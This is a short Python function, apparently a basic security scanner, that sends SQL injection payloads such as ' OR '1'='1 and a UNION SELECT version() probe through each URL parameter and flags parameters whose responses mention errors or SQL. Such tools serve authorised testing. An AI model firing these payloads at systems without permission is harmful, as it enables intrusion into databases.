import requests

def test_sql_injection(url: str, params: dict) -> list[str]:
    payloads = ["' OR '1'='1", "' OR 1=1 --", "\" OR \"\"=\"", "1' ORDER BY 1--+", "1' UNION SELECT null, version()--+"]
    vulnerable = []

    for param in params:
        for payload in payloads:
            test_params = params.copy()
            test_params[param] = payload
            try:
                response = requests.get(url, params=test_params)
                if "error" in response.text.lower() or "sql" in response.text.lower() or "syntax" in response.text.lower():
                    vulnerable.append(f"{param} with payload: {payload}")
            except:
                continue
    return vulnerable
